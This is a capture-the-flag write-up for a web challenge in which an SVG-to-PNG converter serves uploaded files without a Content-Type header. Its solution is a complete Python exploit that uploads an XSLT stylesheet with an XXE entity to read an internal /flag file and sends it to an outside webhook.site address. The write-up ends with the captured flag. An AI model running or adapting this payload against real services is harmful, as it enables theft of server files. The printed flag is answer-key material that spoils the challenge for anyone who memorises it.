
## Convert SVG to PNG
![image](https://github.com/user-attachments/assets/a1d87668-8ee3-4491-b38f-181df52a2f7e)

Category: Web  

## Challenge
Website allows us to upload SVG and convert to PNG.

Found two versions of convertSVG function:
- convertSvgV1 → Vulnerable to XSS and file read (but impossible to trigger)  
- convertSvgV2 → No XSS possible because of `page.setJavaScriptEnabled(false)`

Discovered that the uploaded file is served using `res.end()` without Content-Type header.

This allows us to upload XSLT XML and perform XXE to read internal `/flag`.

Reference:  
https://blog.ankursundara.com/dicectf23-writeups/#impossible-xss  
https://github.com/neocotic/convert-svg/issues/88  

## Solution
Used XSLT payload to read `/flag` and send to webhook.

Payload:
```
import requests
import base64
from urllib.parse import urlencode

# Define the XSLT payload
xmls = """<?xml version="1.0"?>
<!DOCTYPE a [
 <!ENTITY xxe SYSTEM "http://127.0.0.1:8000/flag" >]>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:template match="/asdf">
    <HTML>
      <HEAD>
        <TITLE></TITLE>
      </HEAD>
      <BODY>
        <img>
          <xsl:attribute name="src">
            https://webhook.site/9e?f=&xxe;
          </xsl:attribute>
        </img>
      </BODY>
    </HTML>
  </xsl:template>
</xsl:stylesheet>"""

# Encode the XSLT as base64
xmls_base64 = base64.b64encode(xmls.encode()).decode()

# Define the main XML payload
xml = f"""<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="data:text/plain;base64,{xmls_base64}"?>
<asdf></asdf>"""

base64_encoded_xml = base64.b64encode(xml.encode()).decode()

# URL encode the XML payload
encoded_xml = urlencode({'svg': base64_encoded_xml, 'test': '0'})



# Define the target URL
url = "http://localhost:8000/convert"

# Define the headers
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

# Send the POST request
response = requests.post(url, headers=headers, data=encoded_xml)

# Print the response for debugging
print(f"Status Code: {response.status_code}")
print(f"Response: {response.text}")
```
Sent to `/convert` endpoint.

Triggered bot to visit uploaded XML file.

Got flag in webhook.

![image](https://github.com/user-attachments/assets/de21b3ee-8fad-44ad-a694-a0de3a58f8a7)

```
HTB{XS1_1n_F1l3_4nd_R3nd3r_1s_N0_J0k3}
```
